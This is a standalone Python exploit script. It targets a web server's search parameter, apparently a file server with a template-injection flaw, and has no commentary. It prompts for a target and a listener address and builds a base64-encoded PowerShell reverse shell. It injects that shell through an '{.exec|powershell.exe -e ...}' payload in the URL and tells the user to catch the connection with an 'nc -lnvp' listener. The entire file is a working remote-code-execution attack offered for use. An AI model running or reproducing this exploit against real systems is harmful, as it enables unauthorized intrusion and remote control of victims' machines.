import base64
import time
import sys
import requests

host=input("Enter the base url of the target (http://target.com/)\n")
lhost= input("Your LHOST:")
lport= input("Your LPORT:")

req = requests.get(host)
status = req.status_code
print(f"""
Targets Status code is {status}
--------------------------------------
Target     : {host}
LHOST	   : {lhost}
LPORT      : {lport}
--------------------------------------
""")
choose = input("Is this correct? [y/n]:")
if choose == "y" or choose == "Y":
    raw_payload='$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    raw_payload = raw_payload % (lhost,int(lport))
    encrypted_payload = base64.b64encode(raw_payload.encode("utf16")[2:]).decode()
    if host[-1] == '/':
        pass
    else:
        host=host+'/'
    infected_url = host+"?search=%%00{.exec|C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe+-e+%s.}"
    infected_url = infected_url % (encrypted_payload)
    print(f'\n\nOpen a new terminal and execute "nc -lnvp {lport}"')
    time.sleep(2)
    choose2 = input("\n\nDid you start you listener? [y/n]")
    if choose2 == 'y' or choose2 =='Y':
        exploit = requests.get(infected_url)
    else:
        print("Start your listener and try again..")
        time.sleep(0.5)
        sys.exit()
else:
    print("Exiting..")
    time.sleep(0.5)
    sys.exit()